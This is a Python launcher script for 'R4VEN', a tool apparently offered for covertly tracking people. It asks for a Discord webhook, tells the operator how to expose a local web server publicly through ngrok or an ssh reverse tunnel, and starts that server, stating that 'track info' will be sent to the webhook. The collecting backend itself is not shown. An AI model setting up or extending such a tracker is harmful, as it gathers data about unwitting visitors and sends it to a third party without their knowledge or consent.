#!/usr/bin/env python3
import os
import uvicorn
import webapp_backend

twitter_url = 'https://spyboy.in/twitter'
discord = 'https://spyboy.in/Discord'
website = 'https://spyboy.in/'
blog = 'https://spyboy.blog/'

VERSION = '1.1.2'

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

banner = r'''                                                    
__________    _________   _______________ _______   
\______   \  /  |  \   \ /   /\_   _____/ \      \  
 |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
 |    |   \/    ^   /\     /   |        \/    |    \
 |____|_  /\____   |  \___/   /_______  /\____|__  /
        \/      |__|                  \/         \/ '''


def main():
    """
    program entry_point
    """
    print_banners()
    remove_old_discord_webhook()
    get_new_discord_webhook()
    print_port_forwarding_instructions()
    start_http_server()


def print_banners():
    """
    prints the program banners
    """
    print(f'{R}{banner}{W}\n')
    print(f'{G}[+] {C}Version      : {W}{VERSION}')
    print(f'{G}[+] {C}Created By   : {W}Spyboy')
    print(f'{G} ╰➤ {C}Twitter      : {W}{twitter_url}')
    print(f'{G} ╰➤ {C}Discord      : {W}{discord}')
    print(f'{G} ╰➤ {C}Website      : {W}{website}')
    print(f'{G} ╰➤ {C}Blog         : {W}{blog}\n')


def print_port_forwarding_instructions():
    """
    prints the port forwarding instruction
    """
    print(f'\nTo port forward install ngrok or use ssh')
    print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
    print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run\n')
    print(f'{C}track info will be sent to your discord webhook.\n')


def get_new_discord_webhook():
    """
    gets the new discord webhook from user
    """
    print(f'Enter Discord Webhoook url:')
    dwebhook_input = input()
    file1 = open('dwebhook.js', 'w')
    file1.write(dwebhook_input)
    file1.close()


def remove_old_discord_webhook():
    """
    removes the old discord webhook
    """
    try:
        os.system("rm dwebhook.js")
    except:
        pass


def start_http_server():
    uvicorn.run(webapp_backend.web_app)


if __name__ == "__main__":
    main()
